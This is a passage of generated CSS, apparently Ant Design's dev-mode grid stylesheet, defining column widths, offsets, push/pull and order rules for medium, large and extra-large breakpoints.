      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-13 {
        order: 13;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-12 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 50%;
        max-width: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-12 {
        inset-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-12 {
        inset-inline-end: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-12 {
        margin-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-12 {
        order: 12;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-11 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 45.83333333333333%;
        max-width: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-11 {
        inset-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-11 {
        inset-inline-end: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-11 {
        margin-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-11 {
        order: 11;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-10 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 41.66666666666667%;
        max-width: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-10 {
        inset-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-10 {
        inset-inline-end: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-10 {
        margin-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-10 {
        order: 10;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-9 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 37.5%;
        max-width: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-9 {
        inset-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-9 {
        inset-inline-end: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-9 {
        margin-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-9 {
        order: 9;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-8 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 33.33333333333333%;
        max-width: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-8 {
        inset-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-8 {
        inset-inline-end: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-8 {
        margin-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-8 {
        order: 8;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-7 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 29.166666666666668%;
        max-width: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-7 {
        inset-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-7 {
        inset-inline-end: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-7 {
        margin-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-7 {
        order: 7;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-6 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 25%;
        max-width: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-6 {
        inset-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-6 {
        inset-inline-end: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-6 {
        margin-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-6 {
        order: 6;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-5 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 20.833333333333336%;
        max-width: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-5 {
        inset-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-5 {
        inset-inline-end: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-5 {
        margin-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-5 {
        order: 5;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-4 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 16.666666666666664%;
        max-width: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-4 {
        inset-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-4 {
        inset-inline-end: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-4 {
        margin-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-4 {
        order: 4;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-3 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 12.5%;
        max-width: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-3 {
        inset-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-3 {
        inset-inline-end: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-3 {
        margin-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-3 {
        order: 3;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-2 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 8.333333333333332%;
        max-width: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-2 {
        inset-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-2 {
        inset-inline-end: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-2 {
        margin-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-2 {
        order: 2;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-1 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 4.166666666666666%;
        max-width: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-1 {
        inset-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-1 {
        inset-inline-end: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-1 {
        margin-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-1 {
        order: 1;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-0 {
        display: none;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-0 {
        margin-inline-start: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-0 {
        order: 0;
      }
    }

    @media (min-width: 992px) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-24 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 100%;
        max-width: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-24 {
        inset-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-24 {
        inset-inline-end: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-24 {
        margin-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-24 {
        order: 24;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-23 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 95.83333333333334%;
        max-width: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-23 {
        inset-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-23 {
        inset-inline-end: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-23 {
        margin-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-23 {
        order: 23;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-22 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 91.66666666666666%;
        max-width: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-22 {
        inset-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-22 {
        inset-inline-end: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-22 {
        margin-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-22 {
        order: 22;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-21 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 87.5%;
        max-width: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-21 {
        inset-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-21 {
        inset-inline-end: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-21 {
        margin-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-21 {
        order: 21;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-20 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 83.33333333333334%;
        max-width: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-20 {
        inset-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-20 {
        inset-inline-end: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-20 {
        margin-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-20 {
        order: 20;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-19 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 79.16666666666666%;
        max-width: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-19 {
        inset-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-19 {
        inset-inline-end: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-19 {
        margin-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-19 {
        order: 19;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-18 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 75%;
        max-width: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-18 {
        inset-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-18 {
        inset-inline-end: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-18 {
        margin-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-18 {
        order: 18;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-17 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 70.83333333333334%;
        max-width: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-17 {
        inset-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-17 {
        inset-inline-end: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-17 {
        margin-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-17 {
        order: 17;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-16 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 66.66666666666666%;
        max-width: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-16 {
        inset-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-16 {
        inset-inline-end: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-16 {
        margin-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-16 {
        order: 16;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-15 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 62.5%;
        max-width: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-15 {
        inset-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-15 {
        inset-inline-end: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-15 {
        margin-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-15 {
        order: 15;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-14 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 58.333333333333336%;
        max-width: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-14 {
        inset-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-14 {
        inset-inline-end: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-14 {
        margin-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-14 {
        order: 14;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-13 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 54.166666666666664%;
        max-width: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-13 {
        inset-inline-start: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-13 {
        inset-inline-end: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-13 {
        margin-inline-start: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-13 {
        order: 13;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-12 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 50%;
        max-width: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-12 {
        inset-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-12 {
        inset-inline-end: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-12 {
        margin-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-12 {
        order: 12;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-11 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 45.83333333333333%;
        max-width: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-11 {
        inset-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-11 {
        inset-inline-end: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-11 {
        margin-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-11 {
        order: 11;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-10 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 41.66666666666667%;
        max-width: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-10 {
        inset-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-10 {
        inset-inline-end: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-10 {
        margin-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-10 {
        order: 10;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-9 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 37.5%;
        max-width: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-9 {
        inset-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-9 {
        inset-inline-end: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-9 {
        margin-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-9 {
        order: 9;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-8 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 33.33333333333333%;
        max-width: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-8 {
        inset-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-8 {
        inset-inline-end: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-8 {
        margin-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-8 {
        order: 8;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-7 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 29.166666666666668%;
        max-width: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-7 {
        inset-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-7 {
        inset-inline-end: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-7 {
        margin-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-7 {
        order: 7;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-6 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 25%;
        max-width: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-6 {
        inset-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-6 {
        inset-inline-end: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-6 {
        margin-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-6 {
        order: 6;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-5 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 20.833333333333336%;
        max-width: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-5 {
        inset-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-5 {
        inset-inline-end: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-5 {
        margin-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-5 {
        order: 5;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-4 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 16.666666666666664%;
        max-width: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-4 {
        inset-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-4 {
        inset-inline-end: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-4 {
        margin-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-4 {
        order: 4;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-3 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 12.5%;
        max-width: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-3 {
        inset-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-3 {
        inset-inline-end: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-3 {
        margin-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-3 {
        order: 3;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-2 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 8.333333333333332%;
        max-width: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-2 {
        inset-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-2 {
        inset-inline-end: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-2 {
        margin-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-2 {
        order: 2;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-1 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 4.166666666666666%;
        max-width: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-1 {
        inset-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-1 {
        inset-inline-end: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-1 {
        margin-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-1 {
        order: 1;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-0 {
        display: none;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-offset-0 {
        margin-inline-start: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-lg-order-0 {
        order: 0;
      }
    }

    @media (min-width: 1200px) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-24 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 100%;
        max-width: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-24 {
        inset-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-24 {
        inset-inline-end: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-24 {
        margin-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-24 {
        order: 24;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-23 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 95.83333333333334%;
        max-width: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-23 {
        inset-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-23 {
        inset-inline-end: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-23 {
        margin-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-23 {
        order: 23;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-22 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 91.66666666666666%;
        max-width: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-22 {
        inset-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-22 {
        inset-inline-end: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-22 {
        margin-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-22 {
        order: 22;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-21 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 87.5%;
        max-width: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-21 {
        inset-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-21 {
        inset-inline-end: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-21 {
        margin-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-21 {
        order: 21;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-20 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 83.33333333333334%;
        max-width: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-20 {
        inset-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-20 {
        inset-inline-end: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-20 {
        margin-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-20 {
        order: 20;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-19 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 79.16666666666666%;
        max-width: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-19 {
        inset-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-19 {
        inset-inline-end: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-19 {
        margin-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-19 {
        order: 19;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-18 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 75%;
        max-width: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-18 {
        inset-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-18 {
        inset-inline-end: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-18 {
        margin-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-18 {
        order: 18;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-17 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 70.83333333333334%;
        max-width: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-17 {
        inset-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-17 {
        inset-inline-end: 70.83333333333334%;
      }

